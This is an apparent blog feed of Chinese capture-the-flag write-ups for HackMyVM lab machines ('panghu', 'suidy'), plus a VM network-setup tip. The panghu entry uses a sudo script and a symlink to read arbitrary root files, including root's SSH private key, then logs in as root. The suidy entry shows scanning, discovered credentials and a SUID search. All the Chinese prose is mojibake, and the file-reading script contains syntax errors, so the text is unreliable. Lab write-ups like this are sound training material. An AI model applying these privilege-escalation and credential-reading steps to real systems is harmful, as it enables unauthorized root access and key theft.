<h3 id="ç‰ˆæœ¬2"><a href="#ç‰ˆæœ¬2" class="headerlink" title="ç‰ˆæœ¬2"></a>ç‰ˆæœ¬2</h3><p>å¦‚æœå¼€æœºçš„æ—¶å€™ä¸€ç›´åŠ è½½è¿›åº¦è¿›åº¦æ¡ï¼Œæ²¡æœ‰å‡ºç°è“è‰²ç•Œé¢ï¼Œè¯´æ˜æ˜¯å¦ä¸€ç§ç‰ˆæœ¬<br>æŒ‰shiftè¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>ç„¶åæŒ‰eï¼ŒæŠŠroæ”¹æˆ rw single init&#x3D;&#x2F;bin&#x2F;bash å¹¶ä¸”æŠŠè¿™è¡Œåé¢çš„éƒ½åˆ é™¤ï¼Œç›´åˆ°initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + xå¼€æœº<br>å’Œdibianç³»ä¸€æ ·ç”¨ip aæŸ¥çœ‹çœŸå®ipç«¯å£<br>ä¸ä¸€æ ·çš„æ˜¯è¿™é‡Œç½‘å¡é…ç½®æ–‡ä»¶åœ¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>netplan<span class="regexp">/00-installer-config.yaml #æœ‰æ—¶å€™ä¸å«è¿™ä¸ªåœ¨/</span>etc/netplanä¸‹æ‰¾å°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure></div>
<p>ä¿®æ”¹æˆçœŸå®ç½‘å¡ï¼ˆæˆ‘è¿™é‡Œ3æ”¹æˆ1ï¼‰<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o å›è½¦  ctrl + x é€€å‡º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br><span class="line">netplan apply</span><br></pre></td></tr></table></figure></div>
<p>è®©ä¿®æ”¹åçš„æ–‡ä»¶ç”Ÿæ•ˆ</p>
<p>ç„¶åé‡å¯é¶æœº å°±å¯ä»¥è·å–åˆ°é¶æœºipäº†</p>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>å¦‚æœè¿™æ ·ä¿®æ”¹äº†ç½‘å¡ä¿¡æ¯çš„è¯ï¼Œæ‰“é¶æœºç¢°åˆ°æ¯”å¦‚knockè¿™æ ·çš„æœåŠ¡çš„è¯ï¼Œä¹Ÿè¦å…ˆè¿›å…¥é¶æœºçš„å‘½ä»¤è¡Œæ¨¡å¼ä¿®æ”¹knockç­‰çš„é…ç½®ï¼Œå¯ä»¥å‚è€ƒ <a href="/posts/16384.html" title="HMV-Alzheimer">HMV-Alzheimer</a></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>é¶åœºé…ç½®</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>panghu</title>
    <url>/posts/59637.html</url>
    <content><![CDATA[<p>panghuå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a1fe35d0e0a243d4fbcf9f.png"><br>è¿™ä¸ªæ˜¯ä¸ªç®€å•çš„é¶æœºï¼Œä½†æ˜¯æˆ‘æœ‰ä¸€ä¸ªç‚¹æ²¡æœ‰æƒ³åˆ°ï¼Œå¡äº†å¾ˆä¹…ï¼Œå¼€äº†æ‡¦å¤«æ¨¡å¼<br>ç™»å½•å…¥å£æ˜¯ssh&#x2F;panghu</p>
<h1 id="ç¬¬ä¸€é˜¶æ®µï¼ˆè¯»åˆ°-root-root-txt"><a href="#ç¬¬ä¸€é˜¶æ®µï¼ˆè¯»åˆ°-root-root-txt" class="headerlink" title="ç¬¬ä¸€é˜¶æ®µï¼ˆè¯»åˆ°&#x2F;root&#x2F;root.txt)"></a>ç¬¬ä¸€é˜¶æ®µï¼ˆè¯»åˆ°&#x2F;root&#x2F;root.txt)</h1><p>æœ‰ä¸€ä¸ªsudoæƒé™çš„è„šæœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">ssh:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">PASSWD:</span> /opt/lzh.sh</span><br><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>cat /opt/lzh.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cd /home/ssh</span><br><span class="line">cat backup/hi</span><br></pre></td></tr></table></figure></div>
<p>å†…å®¹æ˜¯æŸ¥çœ‹&#x2F;home&#x2F;ssh&#x2F;backup&#x2F;hi<br>ç°åœ¨çš„ç›®æ ‡æ˜¯å¦‚ä½•åˆ©ç”¨è¿™ä¸ªè„šæœ¬èƒ½è¯»åˆ°&#x2F;root&#x2F;root.txtå‘¢<br>æ²¡æœ‰ä¿®æ”¹hiçš„æƒé™ï¼Œå¯¹hiæ²¡æœ‰ä»»ä½•çš„æƒé™<br>ä½†æ˜¯å¯¹backupè¿™ä¸ªç›®å½•æœ‰xæ“ä½œæƒé™ï¼Œæ— æ³•åˆ é™¤å°±æŠŠbackupé‡å‘½å<br>ç„¶åæ–°å»ºä¸€ä¸ªbackup ç„¶åç”¨è½¯é“¾æ¥å°±å¯ä»¥è¯»åˆ°äº†<br>ï¼ˆæˆ‘ä¸€ç›´åœ¨hiè¿™ä¸ªæ–‡ä»¶é‡Œé¢æƒ³ï¼Œå…¶å®å•¥éƒ½æ²¡æœ‰ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sv /root/root.txt /home/ssh/backup/hi</span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>

<h1 id="ç¬¬äºŒé˜¶æ®µ"><a href="#ç¬¬äºŒé˜¶æ®µ" class="headerlink" title="ç¬¬äºŒé˜¶æ®µ"></a>ç¬¬äºŒé˜¶æ®µ</h1><p>é€šè¿‡ç¬¬ä¸€é˜¶æ®µå°±å¯ä»¥çŸ¥é“ï¼Œåˆ©ç”¨lzh.shå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶å†…å®¹<br>æ‰€ä»¥å¯ä»¥ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè„šæœ¬å†…å®¹æ¥è‡ªç¾¤é‡Œçš„eviden</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span>[ -e <span class="string">&quot;backup&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">rm</span> -rf backup</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;removed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">mkdir</span> -p backup</span><br><span class="line">source_file=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">ln</span> -sn <span class="string">&quot;<span class="variable">$&#123;$source_file&#125;</span>&quot;</span> <span class="string">&quot;/home/ssh/backup/hi&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å­å°±å¯ä»¥è‡ªåŠ¨è¯»å–äº†<br>æˆ‘ä»¬å»è¯»sshçš„é…ç½®æ–‡ä»¶ï¼Œæ€è·¯æ˜¯è¯»å–ç§é’¥ç„¶åç™»å½•root</p>
<p>æ‰¾åˆ°sshç§é’¥çš„åœ°å€ ä½†æ˜¯ä¸æ˜¯id_rsaæ˜¯id_ed25519ï¼Œè€Œä¸”è¿™ä¸ªç›®å½•åœ¨rootç›®å½•ä¸‹é¢ï¼Œä¸æ˜¯sshç›®å½•ï¼Œå°±è§‰å¾—ä¸ºä»€ä¹ˆæœ‰ç§é’¥è¿˜ç™»å½•ä¸ä¸Šrootï¼Œhhhhh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">removed</span><br><span class="line"><span class="string">&#x27;backup/hi&#x27;</span> -&gt; <span class="string">&#x27;/etc/ssh/ssh_config&#x27;</span></span><br><span class="line"><span class="comment">#	$OpenBSD: ssh_config,v 1.36 2023/08/02 23:04:38 djm Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the ssh client system-wide configuration file.  See</span></span><br><span class="line"><span class="comment"># ssh_config(5) for more information.  This file provides defaults for</span></span><br><span class="line"><span class="comment"># users, and the values can be changed in per-user configuration files</span></span><br><span class="line"><span class="comment"># or on the command line.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration data is parsed as follows:</span></span><br><span class="line"><span class="comment">#  1. command line options</span></span><br><span class="line"><span class="comment">#  2. user-specific file</span></span><br><span class="line"><span class="comment">#  3. system-wide file</span></span><br><span class="line"><span class="comment"># Any configuration value is only changed the first time it is set.</span></span><br><span class="line"><span class="comment"># Thus, host-specific definitions should be at the beginning of the</span></span><br><span class="line"><span class="comment"># configuration file, and defaults at the end.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site-wide defaults for some commonly used options.  For a comprehensive</span></span><br><span class="line"><span class="comment"># list of available options, their meanings and defaults, please see the</span></span><br><span class="line"><span class="comment"># ssh_config(5) man page.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include configuration snippets before processing this file to allow the</span></span><br><span class="line"><span class="comment"># snippets to override directives set in this file.</span></span><br><span class="line"><span class="comment">#Include /etc/ssh/ssh_config.d/*.conf</span></span><br><span class="line"><span class="comment">#Banner /etc/shadow</span></span><br><span class="line"><span class="comment"># Host *</span></span><br><span class="line"><span class="comment">#   ForwardAgent no</span></span><br><span class="line"><span class="comment">#   ForwardX11 no</span></span><br><span class="line"><span class="comment">#   PasswordAuthentication yes</span></span><br><span class="line"><span class="comment">#   HostbasedAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIDelegateCredentials no</span></span><br><span class="line"><span class="comment">#   BatchMode no</span></span><br><span class="line"><span class="comment">#   CheckHostIP no</span></span><br><span class="line"><span class="comment">#   AddressFamily any</span></span><br><span class="line"><span class="comment">#   ConnectTimeout 0</span></span><br><span class="line"><span class="comment">#   StrictHostKeyChecking ask</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_dsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ecdsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="comment">#   Port 22</span></span><br><span class="line"><span class="comment">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span></span><br><span class="line"><span class="comment">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span></span><br><span class="line"><span class="comment">#   EscapeChar ~</span></span><br><span class="line"><span class="comment">#   Tunnel no</span></span><br><span class="line"><span class="comment">#   TunnelDevice any:any</span></span><br><span class="line"><span class="comment">#   PermitLocalCommand no</span></span><br><span class="line"><span class="comment">#   VisualHostKey no</span></span><br><span class="line"><span class="comment">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span></span><br><span class="line"><span class="comment">#   RekeyLimit 1G 1h</span></span><br><span class="line"><span class="comment">#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>root<span class="regexp">/.ssh/i</span>d_ed25519</span><br></pre></td></tr></table></figure></div>
<p>vi id_rsa<br>chmod 600 id_rsa<br>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x32;&#x34;&#48;&#x2e;&#x31;&#x35;">root@192.168.240.15</a> -i id_rsa</p>
<pre><code>ç™»å½•rootäº†


</code></pre>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-suidy</title>
    <url>/posts/11143.html</url>
    <content><![CDATA[<p>HMV-suidyé¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a81f4bd0e0a243d4fd3463.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.169 -p-</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">09</span> <span class="number">11</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.169</span> (<span class="number">192.168</span>.<span class="number">179.169</span>)</span><br><span class="line">Host is up (<span class="number">0.0014</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">8</span>a:cb:<span class="number">7</span>e:<span class="number">8</span>a:<span class="number">72</span>:<span class="number">82</span>:<span class="number">84</span>:<span class="number">9</span>a:<span class="number">11</span>:<span class="number">43</span>:<span class="number">61</span>:<span class="number">15</span>:c1:e6:<span class="number">32</span>:<span class="number">0</span>b (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">7</span>a:<span class="number">0</span>e:b6:dd:<span class="number">8</span>f:ee:a7:<span class="number">70</span>:d9:b1:b5:<span class="number">6</span>e:<span class="number">44</span>:<span class="number">8</span>f:c0:<span class="number">49</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">80</span>:<span class="number">18</span>:e6:c7:<span class="number">01</span>:<span class="number">0</span>e:c6:<span class="number">6</span>d:<span class="number">7</span>d:f4:d2:<span class="number">9</span>f:c9:d0:<span class="number">6</span>f:<span class="number">4</span>c (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">MAC <span class="params">Address:</span> AA:<span class="number">6</span>D:<span class="number">30</span>:<span class="number">09</span>:<span class="number">71</span>:E8 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.39</span> ms <span class="number">192.168</span>.<span class="number">179.169</span> (<span class="number">192.168</span>.<span class="number">179.169</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">9.93</span> seconds</span><br></pre></td></tr></table></figure></div>


<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.169                                                         </span><br><span class="line">hi</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- hi again --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç›®å½•æ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u 192.168.179.169 -w /usr/share/wordlists/dirb/common.txt </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.169</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 22]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 362]</span><br><span class="line"><span class="section">Progress: 4614 / 4615 (99.98%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.169/robots.txt</span><br><span class="line">/hi</span><br><span class="line">/....\..\.-\--.\.-\..\-.</span><br><span class="line">/shehatesme</span><br></pre></td></tr></table></figure></div>
<p>æ‰«åˆ°ä¸€ä¸ªrobots.txt è®¿é—®å‘ç°æ˜¯ä¸€ä¸ªæ‘©æ–¯å¯†ç å’Œä¸€ä¸ªshehatesmeï¼Œè§£å¯† è§£å¯†æ—¶å€™çš„ç»“æœæ˜¯hi again<br>é‚£ç›®æ ‡å°±æ˜¯ç¬¬äºŒè¡Œçš„å†…å®¹äº†<br>åœ¨webè®¿é—®è¿™ä¸ªç›®å½•ï¼Œå‡ºç°ä¸€æ®µè¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">She hates me because I FOUND THE REAL SECRET! I <span class="built_in">put</span> <span class="keyword">in</span> this <span class="built_in">directory</span> <span class="keyword">a</span> lot <span class="keyword">of</span> .txt <span class="built_in">files</span>. <span class="literal">ONE</span> <span class="keyword">of</span> .txt <span class="built_in">files</span> <span class="keyword">contains</span> credentials like <span class="string">&quot;theuser/thepass&quot;</span> <span class="built_in">to</span> access <span class="built_in">to</span> her <span class="keyword">system</span>! All that you need is <span class="keyword">an</span> small dict <span class="built_in">from</span> Seclist!</span><br></pre></td></tr></table></figure></div>
<p>å‘Šè¯‰äº†åº”è¯¥åœ¨è¿™ä¸ªç›®å½•æ‰«æï¼Œå­—å…¸éƒ½å’Œæˆ‘ä»¬è¯´äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u 192.168.179.169/shehatesme -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.169/shehatesme</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 229]</span><br><span class="line">/.                    (Status: 301) [Size: 185] [--&gt; http://192.168.179.169/shehatesme/./]</span><br><span class="line">/search.txt           (Status: 200) [Size: 16]</span><br><span class="line"><span class="section">Progress: 11424 / 11425 (99.99%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.169/shehatesme/search.txt</span><br><span class="line">jaime11/JKiufg6</span><br></pre></td></tr></table></figure></div>
<p>ç»™äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œå°è¯•ç™»å½•,ä½†æ˜¯ç™»å½•ä¸ä¸Šå»ï¼Œç”¨ä¸€å¼€å§‹&#x2F;shehatesmeç›®å½•ä¸­çš„è´¦å·å¯†ç ç™»å½•æˆåŠŸ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh jaime11@<span class="number">192.168</span>.<span class="number">179.169</span>                                                                      </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.179.169 (192.168.179.169)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:e/Y+QbyX33+qoiZpch9G5Mgf32Y1Cj2eBFPlMp3Qx10.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.179.169&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">jaime11@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Permission denied, please <span class="keyword">try</span> again.</span><br><span class="line">jaime11@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh theuser@<span class="number">192.168</span>.<span class="number">179.169</span></span><br><span class="line">theuser@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux suidy <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Sep <span class="number">27</span> <span class="number">00</span>:<span class="number">41</span>:<span class="number">28</span> <span class="number">2020</span></span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-<span class="number">8</span>)</span><br><span class="line">theuser@suidy:~$ </span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>å‘ç°ä¸€ä¸ªå®¶ç›®å½•ä¸‹é¢çš„æ–‡ä»¶æœ‰suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidy</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/suidy</span><span class="regexp">/suidyyyyy</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
